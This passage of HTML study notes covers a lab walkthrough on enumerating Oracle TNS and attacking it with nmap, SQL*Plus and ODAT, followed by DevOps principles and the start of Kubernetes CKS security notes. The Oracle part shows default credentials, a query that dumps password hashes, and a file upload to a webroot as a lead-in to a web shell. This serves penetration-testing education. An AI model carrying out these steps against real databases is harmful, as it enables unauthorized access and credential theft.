<p>This feature helps secure the database architecture from unauthorized access or attacks that attempt to compromise the data on the network traffic. Besides, it provides advanced tools and capabilities for database administrators and developers since it offers comprehensive performance monitoring and analysis tools, error reporting and logging capabilities, workload management, and fault tolerance through database services.</p>
<h2 id="oracle-tns-clients"><a class="header" href="#oracle-tns-clients">Oracle TNS Clients</a></h2>
<p>Oracle TNS is often used with other Oracle services like Oracle DBSNMP, Oracle Databases, Oracle Application Server, Oracle Enterprise Manager, Oracle Fusion Middleware, web servers, and many more. Common clients include:</p>
<ul>
<li><strong>SQL*Plus</strong>: Command-line interface for Oracle databases</li>
<li><strong>ODAT (Oracle Database Attacking Tool)</strong>: Open-source penetration testing tool written in Python</li>
<li><strong>Oracle SQL Developer</strong>: GUI-based database development tool</li>
<li><strong>Oracle Enterprise Manager</strong>: Web-based management interface</li>
</ul>
<h2 id="default-configuration-2"><a class="header" href="#default-configuration-2">Default Configuration</a></h2>
<p>The default configuration of the Oracle TNS server varies depending on the version and edition of Oracle software installed. However, some common settings are usually configured by default in Oracle TNS. By default, the listener listens for incoming connections on the TCP/1521 port. However, this default port can be changed during installation or later in the configuration file. The TNS listener is configured to support various network protocols, including TCP/IP, UDP, IPX/SPX, and AppleTalk. The listener can also support multiple network interfaces and listen on specific IP addresses or all available network interfaces. By default, Oracle TNS can be remotely managed in Oracle 8i/9i but not in Oracle 10g/11g.</p>
<p>The default configuration of the TNS listener also includes a few basic security features. For example, the listener will only accept connections from authorized hosts and perform basic authentication using a combination of hostnames, IP addresses, and usernames and passwords. Additionally, the listener will use Oracle Net Services to encrypt the communication between the client and the server. The configuration files for Oracle TNS are called <code>tnsnames.ora</code> and <code>listener.ora</code> and are typically located in the <code>$ORACLE_HOME/network/admin</code> directory. The plain text file contains configuration information for Oracle database instances and other network services that use the TNS protocol.</p>
<p>There have been made many changes for the default installation of Oracle services. For example, Oracle 9 has a default password, <code>CHANGE_ON_INSTALL</code>, whereas Oracle 10 has no default password set. The Oracle DBSNMP service also uses a default password, <code>dbsnmp</code> that we should remember when we come across this one. Another example would be that many organizations still use the finger service together with Oracle, which can put Oracle‚Äôs service at risk and make it vulnerable when we have the required knowledge of a home directory.</p>
<h3 id="tnsnamesora"><a class="header" href="#tnsnamesora">tnsnames.ora</a></h3>
<p>Each database or service has a unique entry in the <code>tnsnames.ora</code> file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service. The client-side Oracle Net Services software uses the <code>tnsnames.ora</code> file to resolve service names to network addresses.</p>
<p>Example <code>tnsnames.ora</code> file:</p>
<pre><code class="language-txt">ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
</code></pre>
<p>Here we can see a service called ORCL, which is listening on port TCP/1521 on the IP address 10.129.11.102. Clients should use the service name <code>orcl</code> when connecting to the service. However, the <code>tnsnames.ora</code> file can contain many such entries for different databases and services. The entries can also include additional information, such as authentication details, connection pooling settings, and load balancing configurations.</p>
<h3 id="listenerora"><a class="header" href="#listenerora">listener.ora</a></h3>
<p>The <code>listener.ora</code> file is a server-side configuration file that defines the listener process‚Äôs properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance.</p>
<p>Example <code>listener.ora</code> file:</p>
<pre><code class="language-txt">SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
</code></pre>
<p>In short, the client-side Oracle Net Services software uses the <code>tnsnames.ora</code> file to resolve service names to network addresses, while the listener process uses the <code>listener.ora</code> file to determine the services it should listen to and the behavior of the listener.</p>
<p>Oracle databases can be protected by using so-called PL/SQL Exclusion List (PlsqlExclusionList). It is a user-created text file that needs to be placed in the <code>$ORACLE_HOME/sqldeveloper</code> directory, and it contains the names of PL/SQL packages or types that should be excluded from execution. Once the PL/SQL Exclusion List file is created, it can be loaded into the database instance. It serves as a blacklist that cannot be accessed through the Oracle Application Server.</p>
<h2 id="configuration-settings"><a class="header" href="#configuration-settings">Configuration Settings</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Setting</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>DESCRIPTION</code></td><td>A descriptor that provides a name for the database and its connection type.</td></tr>
<tr><td><code>ADDRESS</code></td><td>The network address of the database, which includes the hostname and port number.</td></tr>
<tr><td><code>PROTOCOL</code></td><td>The network protocol used for communication with the server</td></tr>
<tr><td><code>PORT</code></td><td>The port number used for communication with the server</td></tr>
<tr><td><code>CONNECT_DATA</code></td><td>Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.</td></tr>
<tr><td><code>INSTANCE_NAME</code></td><td>The name of the database instance the client wants to connect.</td></tr>
<tr><td><code>SERVICE_NAME</code></td><td>The name of the service that the client wants to connect to.</td></tr>
<tr><td><code>SERVER</code></td><td>The type of server used for the database connection, such as dedicated or shared.</td></tr>
<tr><td><code>USER</code></td><td>The username used to authenticate with the database server.</td></tr>
<tr><td><code>PASSWORD</code></td><td>The password used to authenticate with the database server.</td></tr>
<tr><td><code>SECURITY</code></td><td>The type of security for the connection.</td></tr>
<tr><td><code>VALIDATE_CERT</code></td><td>Whether to validate the certificate using SSL/TLS.</td></tr>
<tr><td><code>SSL_VERSION</code></td><td>The version of SSL/TLS to use for the connection.</td></tr>
<tr><td><code>CONNECT_TIMEOUT</code></td><td>The time limit in seconds for the client to establish a connection to the database.</td></tr>
<tr><td><code>RECEIVE_TIMEOUT</code></td><td>The time limit in seconds for the client to receive a response from the database.</td></tr>
<tr><td><code>SEND_TIMEOUT</code></td><td>The time limit in seconds for the client to send a request to the database.</td></tr>
<tr><td><code>SQLNET.EXPIRE_TIME</code></td><td>The time limit in seconds for the client to detect a connection has failed.</td></tr>
<tr><td><code>TRACE_LEVEL</code></td><td>The level of tracing for the database connection.</td></tr>
<tr><td><code>TRACE_DIRECTORY</code></td><td>The directory where the trace files are stored.</td></tr>
<tr><td><code>TRACE_FILE_NAME</code></td><td>The name of the trace file.</td></tr>
<tr><td><code>LOG_FILE</code></td><td>The file where the log information is stored.</td></tr>
</tbody>
</table>
</div>
<h2 id="setting-up-tools"><a class="header" href="#setting-up-tools">Setting Up Tools</a></h2>
<p>Before we can enumerate the TNS listener and interact with it, we need to download a few packages and tools for our Pwnbox instance in case it does not have these already. Here is a list of commands that does all of that:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
source ~/.bashrc
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
</code></pre>
<p>After that, we can try to determine if the installation was successful by running the following command:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ ./odat.py -h

usage: odat.py [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
               ...

            _  __   _  ___ 
           / \|  \ / \|_ _|
          ( o ) o ) o || | 
           \_/|__/|_n_||_| 
-------------------------------------------
  _        __           _           ___ 
 / \      |  \         / \         |_ _|
( o )       o )         o |         | | 
 \_/racle |__/atabase |_n_|ttacking |_|ool 
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
...SNIP...
</code></pre>
<p>Oracle Database Attacking Tool (ODAT) is an open-source penetration testing tool written in Python and designed to enumerate and exploit vulnerabilities in Oracle databases. It can be used to identify and exploit various security flaws in Oracle databases, including SQL injection, remote code execution, and privilege escalation.</p>
<h2 id="footprinting-oracle-tns-services"><a class="header" href="#footprinting-oracle-tns-services">Footprinting Oracle TNS Services</a></h2>
<p>There are many reasons why an Oracle TNS server could be accessed from an external network. Nevertheless, it is far from being a best practice, and databases that can be reached externally are often found. Usually, the Oracle TNS server runs on TCP port 1521.</p>
<h3 id="scanning-oracle-tns-server"><a class="header" href="#scanning-oracle-tns-server">Scanning Oracle TNS Server</a></h3>
<p><code>nmap</code> can be used to scan and enumerate Oracle TNS servers:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
</code></pre>
<p>We can see that the port is open, and the service is running. In Oracle RDBMS, a System Identifier (SID) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. An instance is a set of processes and memory structures that interact to manage the database‚Äôs data. When a client connects to an Oracle database, it specifies the database‚Äôs SID along with its connection string. The client uses this SID to identify which database instance it wants to connect to. Suppose the client does not specify a SID. Then, the default value defined in the <code>tnsnames.ora</code> file is used.</p>
<p>The SIDs are an essential part of the connection process, as it identifies the specific instance of the database the client wants to connect to. If the client specifies an incorrect SID, the connection attempt will fail. Database administrators can use the SID to monitor and manage the individual database instances.</p>
<h2 id="oracle-rdbms---database-enumeration"><a class="header" href="#oracle-rdbms---database-enumeration">Oracle RDBMS - Database Enumeration</a></h2>
<p>Once we have access to an Oracle database, we can connect using SQL*Plus:</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL&gt; select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
</code></pre>
<p>We can follow many approaches once we get access to an Oracle database. It highly depends on the information we have and the entire setup. However, we can not add new users or make any modifications. From this point, we could retrieve the password hashes from the <code>sys.user$</code> and try to crack them offline.</p>
<h2 id="oracle-rdbms---extract-password-hashes"><a class="header" href="#oracle-rdbms---extract-password-hashes">Oracle RDBMS - Extract Password Hashes</a></h2>
<p>The query for extracting password hashes would look like the following:</p>
<pre><code class="language-bash">SQL&gt; select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
</code></pre>
<h2 id="oracle-rdbms---file-upload"><a class="header" href="#oracle-rdbms---file-upload">Oracle RDBMS - File Upload</a></h2>
<p>Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>OS</th><th>Path</th></tr>
</thead>
<tbody>
<tr><td>Linux</td><td><code>/var/www/html</code></td></tr>
<tr><td>Windows</td><td><code>C:\inetpub\wwwroot</code></td></tr>
</tbody>
</table>
</div>
<p>First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ echo "Oracle File Upload Test" &gt; testing.txt
rnemeth@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
</code></pre>
<p>Finally, we can test if the file upload approach worked with curl. Therefore, we will use a GET <code>http://&lt;IP&gt;</code> request, or we can visit via browser.</p>
<pre><code class="language-bash">rnemeth@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
</code></pre>
<h2 id="security-best-practices-2"><a class="header" href="#security-best-practices-2">Security Best Practices</a></h2>
<p>When setting up an Oracle TNS server, it is important to follow security best practices:</p>
<ul>
<li><strong>Strong passwords</strong>: Use strong passwords for Oracle users, especially default accounts. Change default passwords like <code>CHANGE_ON_INSTALL</code> and <code>dbsnmp</code></li>
<li><strong>Network access</strong>: Restrict network access to Oracle TNS servers; avoid exposing them to public networks unless necessary</li>
<li><strong>Encryption</strong>: Enable SSL/TLS encryption for connections to prevent data interception</li>
<li><strong>Configuration file permissions</strong>: Ensure configuration files (<code>tnsnames.ora</code>, <code>listener.ora</code>) have proper permissions to prevent unauthorized access</li>
<li><strong>Remote management</strong>: Disable remote management in Oracle 10g/11g+ unless specifically required</li>
<li><strong>PL/SQL Exclusion List</strong>: Use PL/SQL Exclusion Lists to restrict access to sensitive packages</li>
<li><strong>Listener security</strong>: Configure listener security settings to only accept connections from authorized hosts</li>
<li><strong>Regular updates</strong>: Keep Oracle database software updated with the latest security patches</li>
<li><strong>Audit logging</strong>: Enable audit logging to track database access and changes</li>
<li><strong>Principle of least privilege</strong>: Follow the principle of least privilege when granting user permissions</li>
<li><strong>SID protection</strong>: Use strong, non-default SIDs and avoid exposing SID information unnecessarily</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="devops"><a class="header" href="#devops">DevOps</a></h1>
<h2 id="directory-map-12"><a class="header" href="#directory-map-12">Directory Map</a></h2>
<ul>
<li><a href="#devops-principles">principles</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="devops-principles"><a class="header" href="#devops-principles">DevOps Principles</a></h1>
<ol>
<li>Customer-centric action - All activity around building software must frequently involve the clients</li>
<li>Create with the end in mind - Focus on building a whole product that is being presented to real customers</li>
<li>End-to-end responsibility - All members of a devops team are responsible for the software they deliver</li>
<li>Cross-functional autonomous teams - Organizations that work with vertical and fully responsible teams will need to let those teams work completely independently throughout the whole life cycle. To do this, each team member must have a broad range of skills, ranging from administration to development.</li>
<li>Continuous Improvement - Adapt to changes continuously</li>
<li>Automate everything - focus on automation in everything that you do</li>
</ol>
<h2 id="the-four-stages-of-the-sdlc"><a class="header" href="#the-four-stages-of-the-sdlc">The four stages of the SDLC:</a></h2>
<ul>
<li>Plan</li>
<li>Develop</li>
<li>Deliver</li>
<li>Operate</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="kubernetes"><a class="header" href="#kubernetes">Kubernetes</a></h1>
<h2 id="directory-map-13"><a class="header" href="#directory-map-13">Directory Map</a></h2>
<ul>
<li><a href="kubernetes/cks">cks</a></li>
<li><a href="kubernetes/kcna">kcna</a></li>
<li><a href="kubernetes/kcsa">kcsa</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="cks"><a class="header" href="#cks">CKS</a></h1>
<h2 id="directory-map-14"><a class="header" href="#directory-map-14">Directory Map</a></h2>
<ul>
<li><a href="#certified-kubernetes-security-specialist-cks-notes">notes</a></li>
<li><a href="#kubernetes-security-specialist-cks-practice-scenarios">questions</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="certified-kubernetes-security-specialist-cks-notes"><a class="header" href="#certified-kubernetes-security-specialist-cks-notes">Certified Kubernetes Security Specialist (CKS) Notes</a></h1>
<p align="center"><img width="180" alt="portfolio_view" src="kubernetes/cks/badge.png"></p>

<p align="center"><img width="300" alt="portfolio_view" src="kubernetes/cks/kubernetes.png"></p>

<h4 align="center"><a href="https://www.cncf.io/certification/cks/">https://www.cncf.io/certification/cks/</a>
<h1 align="center">Certified Kubernetes Security Specialist (CKS) Notes</h1>

<!-- @import "[TOC]" {cmd="toc" depthFrom=1 depthTo=6 orderedList= alse} -->
<h2 id="table-of-contents-7"><a class="header" href="#table-of-contents-7">Table of Contents</a></h2>
<ul>
<li>
<p><a href="#exam">Exam</a></p>
<ul>
<li><a href="#outline">Outline</a></li>
<li><a href="#cirriculum">Cirriculum</a></li>
<li><a href="#changes">Changes</a></li>
<li><a href="#software--environment">Software / Environment</a></li>
<li><a href="#exam-environment-setup">Exam Environment Setup</a>
<ul>
<li><a href="#terminal-shortcutsaliases">Terminal Shortcuts/Aliases</a></li>
<li><a href="#terminal-command-completion">Terminal Command Completion</a></li>
<li><a href="#vim">VIM</a>
<ul>
<li><a href="#pasting-text-into-vim">Pasting Text Into VIM</a></li>
</ul>
</li>
<li><a href="#tmux">tmux</a>
<ul>
<li><a href="#mouse-support">Mouse Support</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p><a href="#preparation">Preparation</a></p>
<ul>
<li><a href="#study-resources">Study Resources</a></li>
<li><a href="#practice">Practice</a></li>
</ul>
</li>
<li>
<p><a href="#fundamentals">Fundamentals</a></p>
</li>
<li>
<p><a href="#1-cluster-setup">Cluster Setup</a></p>
<ul>
<li><a href="#cis-benchmark">CIS Benchmark</a>
<ul>
<li><a href="#what-is-a-security-benchmark">What is a security benchmark?</a></li>
<li><a href="#kubebench">KubeBench</a></li>
</ul>
</li>
<li><a href="#cluster-upgrades">Cluster Upgrades</a>
<ul>
<li><a href="#upgrade-process">Upgrade Process</a></li>
<li><a href="#upgrading-with-kubeadm">Upgrading with Kubeadm</a></li>
</ul>
</li>
<li><a href="#network-policies">Network Policies</a>
<ul>
<li><a href="#overview-9">Overview</a></li>
<li><a href="#key-concepts-1">Key Concepts</a></li>
<li><a href="#common-fields-in-a-network-policy">Common Fields in a Network Policy</a></li>
<li><a href="#example-network-policies">Example Network Policies</a>
<ul>
<li><a href="#allow-all-ingress-traffic">Allow All Ingress Traffic</a></li>
<li><a href="#deny-all-ingress-and-egress-traffic">Deny All Ingress and Egress Traffic</a></li>
<li><a href="#allow-specific-ingress-from-a-namespace">Allow Specific Ingress from a Namespace</a></li>
<li><a href="#allow-egress-to-a-specific-ip">Allow Egress to a Specific IP</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#cilium-network-policy">Cilium Network Policy</a>
<ul>
<li><a href="#cilium-network-policy-structure">Cilium Network Policy Structure</a></li>
<li><a href="#layer-3-rules">Layer 3 Rules</a></li>
<li><a href="#examples-5">Examples</a>
<ul>
<li><a href="#default-deny-all">Default Deny All</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#kubernetes-ingress">Kubernetes Ingress</a>
<ul>
<li><a href="#what-is-ingress">What is Ingress?</a></li>
<li><a href="#why-use-ingress">Why Use Ingress?</a></li>
<li><a href="#key-components-of-ingress">Key Components of Ingress</a></li>
<li><a href="#ingress-resource-configuration">Ingress Resource Configuration</a></li>
<li><a href="#basic-structure">Basic Structure</a></li>
<li><a href="#ingress-with-tls">Ingress with TLS</a></li>
<li><a href="#annotations">Annotations</a></li>
</ul>
</li>
<li><a href="#protecting-node-metadata-and-endpoints">Protecting Node Metadata and Endpoints</a>
<ul>
<li><a href="#protecting-endpoints">Protecting Endpoints</a></li>
<li><a href="#protecting-node-metadata">Protecting Node Metadata</a></li>
</ul>
</li>
<li><a href="#verify-kubernetes-binaries">Verify Kubernetes Binaries</a></li>
<li><a href="#securing-etcd">Securing etcd</a>
<ul>
<li><a href="#play-with-etcd">Play with etcd</a></li>
<li><a href="#encrypting-data-in-transit-in-etcd">Encrypting data in transit in etcd</a></li>
<li><a href="#encrypting-data-at-rest-in-etcd">Encrypting data at rest in etcd</a></li>
</ul>
</li>
<li><a href="#securing-kube-apiserver">Securing kube-apiserver</a>
<ul>
<li><a href="#access-controls">Access Controls</a></li>
<li><a href="#authentication-2">Authentication</a></li>
</ul>
</li>
</ul>
</li>
<li>
<p><a href="#2-cluster-hardening">Cluster Hardening</a></p>
<ul>
<li><a href="#securing-access-to-the-kubeapi-server">Securing Access to the KubeAPI Server</a></li>
<li><a href="#authentication-2">Authentication</a>
<ul>
<li><a href="#user-accounts">User accounts</a></li>
<li><a href="#service-accounts">Service Accounts</a></li>
</ul>
</li>
<li><a href="#tls-certificates">TLS Certificates</a></li>
<li><a href="#kubelet-security">kubelet Security</a></li>
<li><a href="#authorization">Authorization</a>
<ul>
<li><a href="#roles-and-clusterroles">Roles and ClusterRoles</a></li>
<li><a href="#role-bindings-and-cluster-role-bindings">Role Bindings and Cluster Role Bindings</a></li>
</ul>
</li>
<li><a href="#securing-node-metadata">Securing Node Metadata</a></li>
</ul>
</li>
<li>
<p><a href="#3-system-hardening">System Hardening</a></p>
<ul>
<li><a href="#principle-of-least-privilege">Principle of Least Privilege</a></li>
<li><a href="#limit-access-to-nodes">Limit access to nodes</a>
<ul>
<li><a href="#managing-local-users-and-groups">Managing Local Users and Groups</a></li>
<li><a href="#securing-ssh">Securing SSH</a></li>
<li><a href="#using-sudo">Using sudo</a></li>
<li><a href="#remove-packages-packages">Remove Packages Packages</a></li>
<li><a href="#restrict-kernel-modules">Restrict Kernel Modules</a></li>
<li><a href="#disable-open-ports">Disable Open Ports</a></li>
</ul>
</li>
<li><a href="#tracing-syscalls">Tracing Syscalls</a>
<ul>
<li><a href="#strace">strace</a></li>
<li><a href="#aquasec-tracee">AquaSec Tracee</a></li>
<li><a href="#restricting-access-to-syscalls-with-seccomp">Restricting Access to syscalls with seccomp</a></li>
</ul>
</li>
<li><a href="#restrict-access-to-file-systems">Restrict access to file systems</a>
<ul>
<li><a href="#apparmor">AppArmor</a></li>
</ul>
</li>
<li><a href="#linux-capabilities-in-pods">Linux Capabilities in Pods</a></li>
</ul>
</li>
<li>
<p><a href="#4-minimize-microservice-vulnerabilities">Minimize Microservice Vulnerabilities</a></p>
<ul>
<li><a href="#pod-security-admission">Pod Security Admission</a></li>
<li><a href="#security-contexts">Security Contexts</a></li>
<li><a href="#admission-controllers">Admission Controllers</a></li>
<li><a href="#open-policy-agent">Open Policy Agent</a>
<ul>
<li><a href="#opa-in-kubernetes">OPA in Kubernetes</a>
<ul>
<li><a href="#gatekeeper">GateKeeper</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#kubernetes-secrets">Kubernetes Secrets</a></li>
<li><a href="#container-sandboxing">Container Sandboxing</a>
<ul>
<li><a href="#gvisor">gVisor</a></li>
<li><a href="#kata-containers">Kata Containers</a></li>
</ul>
</li>
<li><a href="#runtimeclass">RuntimeClass</a>
<ul>
<li><a href="#to-use-a-runtime-class">To use a runtime class</a></li>
</ul>
</li>
<li><a href="#resource-quotas">Resource Quotas</a></li>
<li><a href="#api-priority-and-fairness">API Priority and Fairness</a></li>
<li><a href="#pod-priority-and-preemption">Pod Priority and Preemption</a></li>
<li><a href="#pod-to-pod-encryption">Pod to Pod Encryption</a></li>
</ul>
</li>
<li>
<p><a href="#5-supply-chain-security">Supply Chain Security</a></p>
<ul>
<li><a href="#sbom">SBOM</a></li>
<li><a href="#reduce-docker-image-size">Reduce docker image size</a></li>
<li><a href="#static-analysis">Static Analysis</a>
<ul>
<li><a href="#sbom-1">SBOM</a></li>
<li><a href="#kubesec">Kubesec</a></li>
<li><a href="#syft">Syft</a></li>
<li><a href="#grype">Grype</a></li>
<li><a href="#kube-linter">Kube-linter</a></li>
</ul>
</li>
<li><a href="#scanning-images-for-vulnerabilities">Scanning Images for Vulnerabilities</a>
<ul>
<li><a href="#trivy">trivy</a></li>
</ul>
</li>
</ul>
</li>
<li>
<p><a href="#6-monitoring-logging-and-runtime-security">Monitoring, Logging, and Runtime Security</a></p>
<ul>
<li><a href="#falco">falco</a></li>
<li><a href="#ensuring-container-immutability">Ensuring Container Immutability</a></li>
<li><a href="#audit-logs">Audit Logs</a>
<ul>
<li><a href="#sample-audit-policy">Sample Audit Policy</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<!-- /code_chunk_output -->
<h1 id="exam"><a class="header" href="#exam">Exam</a></h1>
<h3 id="outline"><a class="header" href="#outline">Outline</a></h3>
<ul>
<li>https://github.com/cncf/curriculum/blob/master/CKS_Curriculum%20v1.31.pdf</li>
</ul>
<h3 id="cirriculum"><a class="header" href="#cirriculum">Cirriculum</a></h3>
<p>Exam objectives that outline the knowledge, skills, and abilities that a Certified Kubernetes Security Specialist (CKS) can be expected to demonstrate.</p>
<h3 id="cluster-setup-10"><a class="header" href="#cluster-setup-10">Cluster Setup (10%)</a></h3>
<ul>
<li>
<p>Use Network security policies to restrict cluster level access</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/services-networking/network-policies/">Kubernetes Documentation &gt; Concepts &gt; Services, Load Balancing, and Networking &gt; Network Policies</a></li>
</ul>
</li>
<li>
<p>Use CIS benchmark to review the security configuration of Kubernetes components (etcd, kubelet, kubedns, kubeapi)</p>
<ul>
<li><a href="https://www.cisecurity.org/benchmark/kubernetes">CIS Security &gt; Securing Kubernetes</a></li>
<li><a href="https://www.aquasec.com/cloud-native-academy/kubernetes-in-production/kubernetes-cis-benchmark-best-practices-in-brief/">Cloud Native Wiki - CIS Benchmark Best Practices</a></li>
<li><a href="https://github.com/aquasecurity/kube-bench">GitHub &gt; Aqua Security &gt; kube-bench</a></li>
</ul>
</li>
<li>
<p>Properly set up Ingress objects with security control</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/services-networking/ingress/#tls">Kubernetes Documentation &gt; Concepts &gt; Services, Load Balancing, and Networking &gt; Ingress &gt; TLS</a></li>
</ul>
</li>
<li>
<p>Protect node metadata and endpoints</p>
<ul>
<li>
<p><a href="https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster/#restricting-cloud-metadata-api-access">Kubernetes Documentation &gt; Tasks &gt; Administer a Cluster &gt; Securing a Cluster</a></p>
<pre><code class="language-yaml"># all pods in namespace cannot access metadata endpoint
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
name: cloud-metadata-deny
namespace: default
spec:
podSelector: {}
policyTypes:
- Egress
egress:
- to:
    - ipBlock:
        cidr: 0.0.0.0/0
        except:
        - 169.254.169.254/32
</code></pre>
</li>
</ul>
</li>
<li>
<p>Minimize use of, and access to, GUI elements</p>
<ul>
<li><a href="https://kubernetes.io/docs/tasks/access-application-cluster/web-ui-dashboard/#accessing-the-dashboard-ui">Kubernetes Documentation &gt; Tasks &gt; Access Applications in a Cluster &gt; Deploy and Access the Kubernetes Dashboard</a></li>
</ul>
</li>
<li>
<p>Verify platform binaries before deploying</p>
<ul>
<li>
<p><a href="https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/">Kubernetes Documentation &gt; Tasks &gt; Install Tools &gt; Install and Set Up kubectl on Linux</a></p>
<blockquote>
<p>Note: Check the step 2 - validate binary</p>
</blockquote>
</li>
</ul>
</li>
</ul>
<h3 id="cluster-hardening-15"><a class="header" href="#cluster-hardening-15">Cluster Hardening (15%)</a></h3>
<ul>
<li>
<p>Restrict access to Kubernetes API</p>
<ul>
<li><a href="https://kubernetes.io/docs/concepts/security/controlling-access/">Kubernetes Documentation &gt; Concepts &gt; Security &gt; Controlling Access to the Kubernetes API</a></li>
</ul>
</li>
<li>
<p>Use Role Based Access Controls to minimize exposure</p>
<ul>
